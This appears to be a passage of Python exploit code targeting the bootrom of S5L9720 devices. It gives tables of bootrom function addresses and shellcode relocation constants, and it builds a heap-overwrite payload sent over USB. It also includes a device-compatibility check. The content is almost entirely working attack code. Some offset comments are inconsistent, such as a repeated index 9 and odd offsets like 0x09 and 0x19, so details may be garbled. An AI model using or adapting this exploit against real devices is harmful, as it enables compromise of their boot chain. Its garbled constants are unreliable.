...
constants_240_4 = [
    0x22030000, #  1 - MAIN_STACK_ADDRESS
        ...
        0x496d, #  3 - nor_init
        0x6c91, #  4 - usb_destroy
        0x1059, #  5 - usb_shutdown
         0x560, #  6 - invalidate_instruction_cache
    0x2202d900, #  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, #  9 - RELOCATE_SHELLCODE_SIZE
        0x795c, #  9 - memmove
         0x534, # 10 - clean_data_cache
         0x290, # 11 - gVersionString
        0x93cd, # 12 - strlcat
...
configs = [
  DeviceConfig('240.4',   constants_240_4),   # S5L9720 (old bootrom)
  DeviceConfig('240.5.1', constants_240_5_1), # S5L9720 (new bootrom)
]

# Pad to length 256 and add heap data for overwrite
payload = '\x00' * 256 + struct.pack('<14I',
              # 1. Allocated chunk to be freed
              # Chunk header: (size 0x9)
        0x94, #   0x00: previous_chunk
         0x5, #   0x04: next_chunk
              # Contents: (requested size 0x1c, allocated size 0x20)
        0x90, #   0x09: buffer[0] - direction
  0x22026290, #   0x0c: buffer[1] - usb_response_buffer
  0xffffffff, #   0x10: buffer[2]
       0x139, #   0x14: buffer[3] - size of payload in bytes
       0x100, #   0x19: buffer[4]
         0x0, #   0x1c: buffer[5]
         0x0, #   0x20: buffer[6]
         0x0, #   0x24: unused
...
def exploit():
  ...
  if 'CPID:9720' not in device.serial_number:
    print 'ERROR: Not a compatible device. This exploit is for S5L9720 devices only. Exiting.'
    sys.exit(1)
